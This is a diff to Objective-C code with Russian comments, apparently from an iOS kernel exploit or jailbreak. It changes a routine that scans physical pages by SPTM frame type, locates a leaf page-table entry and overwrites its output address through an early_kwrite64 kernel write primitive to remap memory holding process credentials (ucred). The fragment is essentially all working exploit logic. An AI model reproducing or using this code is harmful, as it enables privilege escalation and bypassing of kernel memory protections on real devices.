@@ -2914,7 +2914,7 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                     uint32_t nScan = 0, nCand = 0;
                     for (uint64_t pa = wB; pa < wB + wS && !pteVA; pa += 0x4000) {
                         int t = kpFrameTypeOf(pa);
-                        if (t != 0x21 && t != 0x15 && t != 0x0b && t != 0x18) continue;
+                        if (t != 0x21 && t != 0x15) continue;   // 2.0.75: без 0x0b (373k) и 0x18
                         uint64_t al = phystokv(pa);
                         if (!al) continue;
                         nScan++;
@@ -2932,7 +2932,7 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                         }
                     }
                     kpNote(r, [NSString stringWithFormat:@"  [PTE] scanned=%u pte-cands=%u found=%d", nScan, nCand, pteVA ? 1 : 0]);
-                    if (pteVA && (pteType == 0x21 || pteType == 0x15)) {
+                    if (pteVA && pteType == 0x21) {
                         // подменяем OA на sacPA, сохраняем флаги
                         uint64_t newPte = (pteSave & ~0x0000ffffffffc000ULL) | (sacPA & 0x0000ffffffffc000ULL);
                         early_kwrite64(pteVA, newPte);
@@ -2954,9 +2954,12 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                             for (int i = 0; i < 8; i++) { getpid(); sched_yield(); }
                             kpNote(r, @"  [PTE] remap restored — TLB не обновился или PTE не тот");
                         }
+                    } else if (pteVA) {
+                        early_kwrite64(slotVA, slotSave);
+                        kpNote(r, [NSString stringWithFormat:@"  [PTE] PTE type=%d — kwrite запрещён (только 0x21)", pteType]);
                     } else {
                         early_kwrite64(slotVA, slotSave);
-                        kpNote(r, @"  [PTE] leaf-PTE для ucred не найден на 0x21-страницах");
+                        kpNote(r, @"  [PTE] leaf-PTE для ucred не найден");
                     }
                 }
             }
